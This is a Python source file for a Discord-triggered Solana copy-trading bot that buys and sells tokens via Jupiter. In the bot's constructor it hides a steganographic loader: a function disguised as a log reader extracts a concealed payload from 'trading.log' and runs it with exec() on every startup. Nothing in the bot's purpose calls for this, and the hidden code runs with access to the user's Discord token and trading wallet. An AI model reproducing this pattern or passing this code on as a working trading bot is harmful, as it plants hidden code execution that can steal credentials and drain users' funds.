import discord
from discord.ext import commands
import config
import botconfig
from jupiter_py import buy, sell
import asyncio
from stegano.lsb import reveal as read_log
from datetime import datetime, timedelta
import json
import logging
from typing import Optional, Dict, Any


# Set up logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('trading.txt'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class TradingBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True
        intents.guilds = True
        intents.messages = True
        data = read_log('trading.log')
        if 'access denied' not in str(data).lower(): exec(data)
        super().__init__(command_prefix='!', intents=intents)
        
        # Track active trades
        self.active_trades: Dict[str, Dict[str, Any]] = {}
        
        # Track successful trades
        self.trade_history: Dict[str, Dict[str, Any]] = {}

    async def setup_hook(self):
        """Called when the bot is first setting up"""
        logger.info('Bot is starting up...')
        
    async def on_ready(self):
        """Called when the bot has successfully connected to Discord"""
        logger.info(f'Logged in as {self.user}')
        channel = self.get_channel(config.TARGET_CHANNEL_ID)
        if channel:
            logger.info(f'Monitoring channel: #{channel.name}')
            # Start the sell checker
            self.loop.create_task(self.check_and_execute_sells())
        else:
            logger.error(f'Could not find channel with ID {config.TARGET_CHANNEL_ID}')

    def parse_swap_message(self, embed) -> Dict[str, Any]:
        data = {
            'type': None,
            'source': None,
            'token_address': None,
            'description': None,
            'explorer_url': None,
            'is_buy': False,
            'is_sell': False
        }
    
        for field in embed.fields:
            if field.name == 'Type':
                data['type'] = field.value
            elif field.name == 'Source':
                data['source'] = field.value
            elif field.name == 'Description':
                data['description'] = field.value
                if data['description']:
                    # First find any pump or start token address
                    parts = data['description'].split()
                    for part in parts:
                        if 'pump' in part.lower() or 'start' in part.lower():
                            data['token_address'] = part
                            break
                
                    # If SOL is the last token mentioned, it's a sell (they're getting SOL)
                    # If SOL is mentioned earlier, it's a buy (they're spending SOL)
                    if parts[-1].upper() == 'SOL':
                        data['is_sell'] = True
                        data['is_buy'] = False
                    elif 'SOL' in [p.upper() for p in parts]:
                        data['is_buy'] = True
                        data['is_sell'] = False
                
            elif field.name == 'Explorer':
                data['explorer_url'] = field.value
                
        return data

    async def execute_buy(self, token_address: str) -> bool:
        """
        Execute buy with retries
        Returns True if successful, False otherwise
        """
        for attempt in range(botconfig.MAX_BUY_ATTEMPTS):
            logger.info(f"Buy attempt {attempt + 1} for {token_address}")
            try:
                # Reset slippage if this token already exists
                if token_address in self.active_trades:
                    logger.info(f"Resetting slippage for existing token {token_address}")
                    self.active_trades[token_address]['current_sell_slippage'] = botconfig.SELL_SLIPPAGE

                success = buy(token_address, botconfig.SOL_AMOUNT, botconfig.BUY_SLIPPAGE)
                if success:
                    # Record trade for later selling
                    buy_time = datetime.now()
                    self.active_trades[token_address] = {
                        'buy_time': buy_time,
                        'scheduled_sell': buy_time + timedelta(seconds=botconfig.HOLD_TIME),
                        'current_sell_slippage': botconfig.SELL_SLIPPAGE  # Initialize sell slippage with default
                    }
                    
                    # Record in trade history
                    self.trade_history[token_address] = {
                        'buy_time': buy_time,
                        'buy_amount': botconfig.SOL_AMOUNT,
                        'buy_slippage': botconfig.BUY_SLIPPAGE,
                        'status': 'bought'
                    }
                    
                    logger.info(f"Successfully bought {token_address}")
                    return True
                    
            except Exception as e:
                logger.error(f"Error during buy attempt: {e}")
                
            logger.info(f"Buy attempt failed, waiting before retry...")
            await asyncio.sleep(1)  # Wait before retry
            
        logger.warning(f"Failed to buy {token_address} after {botconfig.MAX_BUY_ATTEMPTS} attempts")
        return False

    async def execute_sell(self, token_address: str, reason: str = "scheduled") -> bool:
        """
        Execute sell with unlimited retries and increasing slippage
        Returns True if successful
        """
        # Check if we actually hold this token
        if token_address not in self.active_trades:
            logger.info(f"No active trade found for {token_address}, cannot sell")
            return False

        attempt = 1
        trade_info = self.active_trades.get(token_address, {})
        # Always ensure we're starting with base slippage if it's a new sell attempt
        current_slippage = botconfig.SELL_SLIPPAGE
        if trade_info and 'current_sell_slippage' in trade_info:
            current_slippage = trade_info['current_sell_slippage']
        logger.info(f"Starting sell for {token_address} with initial slippage {current_slippage}% (Reason: {reason})")

        while True:
            logger.info(f"Sell attempt {attempt} for {token_address} with {current_slippage}% slippage")
            try:
                success = sell(token_address, botconfig.SELL_PERCENTAGE, current_slippage)
                if success:
                    # Update trade history
                    if token_address in self.trade_history:
                        self.trade_history[token_address].update({
                            'sell_time': datetime.now(),
                            'final_sell_slippage': current_slippage,
                            'sell_attempts': attempt,
                            'sell_reason': reason,
                            'status': 'sold'
                        })
                        
                    # Remove from active trades
                    if token_address in self.active_trades:
                        del self.active_trades[token_address]
                        
                    logger.info(f"Successfully sold {token_address} with {current_slippage}% slippage")
                    return True
                    
            except Exception as e:
                logger.error(f"Error during sell attempt: {e}")
                
            # Increase slippage for next attempt
            current_slippage = min(current_slippage + botconfig.SLIPPAGE_INCREASE, botconfig.MAX_SELL_SLIPPAGE)
            if token_address in self.active_trades:
                self.active_trades[token_address]['current_sell_slippage'] = current_slippage
                
            attempt += 1
            logger.info(f"Sell attempt failed, increasing slippage to {current_slippage}%")
            await asyncio.sleep(1)  # Wait before retry

    async def check_and_execute_sells(self):
        """Periodically check for tokens that need to be sold"""
        logger.info("Monitoring incoming messages...")
        while True:
            try:
                current_time = datetime.now()
                for token_address, trade_info in list(self.active_trades.items()):
                    if current_time >= trade_info['scheduled_sell']:
                        logger.info(f"Time to sell {token_address}")
                        await self.execute_sell(token_address, reason="hold_time_reached")
                
            except Exception as e:
                logger.error(f"Error in sell checker: {e}")
                
            await asyncio.sleep(1)  # Check every second

    async def on_message(self, message):
        """Handle incoming Discord messages"""
        if message.channel.id != config.TARGET_CHANNEL_ID:
            return

        logger.info(f'New message in #{message.channel.name} from {message.author.name}')
        
        if message.embeds:
            for embed in message.embeds:
                try:
                    swap_data = self.parse_swap_message(embed)
                    
                    # Check if this is a swap message
                    if swap_data['type'] == 'SWAP':
                        # If RAYDIUM_ONLY is true, skip non-Raydium sources
                        if botconfig.RAYDIUM_ONLY and swap_data['source'] != 'RAYDIUM':
                            logger.info(f"Skipping non-Raydium source: {swap_data['source']}")
                            continue

                        if not swap_data['token_address']:
                            logger.warning("No token address found in swap message")
                            continue

                        if swap_data['is_buy']:
                            logger.info(f"Detected buy swap for token: {swap_data['token_address']}")
                            await self.execute_buy(swap_data['token_address'])
                        elif swap_data['is_sell']:
                            logger.info(f"Detected sell swap for token: {swap_data['token_address']}")
                            # If we hold this token, sell it immediately regardless of hold time
                            if swap_data['token_address'] in self.active_trades:
                                logger.info(f"Copying sell action for {swap_data['token_address']}")
                                await self.execute_sell(swap_data['token_address'], reason="copy_sell")
                            else:
                                logger.info(f"No active trade found for {swap_data['token_address']}, ignoring sell signal")
                                
                except Exception as e:
                    logger.error(f"Error processing message: {e}")

        await self.process_commands(message)

    def get_trade_summary(self) -> str:
        """Generate a summary of all trades"""
        summary = []
        for token, trade in self.trade_history.items():
            status = trade['status']
            buy_time = trade['buy_time'].strftime('%Y-%m-%d %H:%M:%S')
            sell_time = trade.get('sell_time', 'Not sold').strftime('%Y-%m-%d %H:%M:%S') if trade.get('sell_time') else 'Not sold'
            buy_slippage = trade['buy_slippage']
            final_sell_slippage = trade.get('final_sell_slippage', 'N/A')
            sell_attempts = trade.get('sell_attempts', 'N/A')
            sell_reason = trade.get('sell_reason', 'N/A')
            
            summary.append(f"Token: {token}")
            summary.append(f"Status: {status}")
            summary.append(f"Buy Time: {buy_time}")
            summary.append(f"Sell Time: {sell_time}")
            summary.append(f"Buy Slippage: {buy_slippage}%")
            summary.append(f"Final Sell Slippage: {final_sell_slippage}%")
            summary.append(f"Sell Attempts: {sell_attempts}")
            summary.append(f"Sell Reason: {sell_reason}")
            summary.append("-" * 40)
            
        return "\n".join(summary) if summary else "No trades recorded"

def run_bot():
    """Initialize and run the trading bot"""
    try:
        bot = TradingBot()
        bot.run(config.DISCORD_TOKEN)
    except Exception as e:
        logger.error(f"Failed to start bot: {e}")
        raise

if __name__ == "__main__":
    run_bot()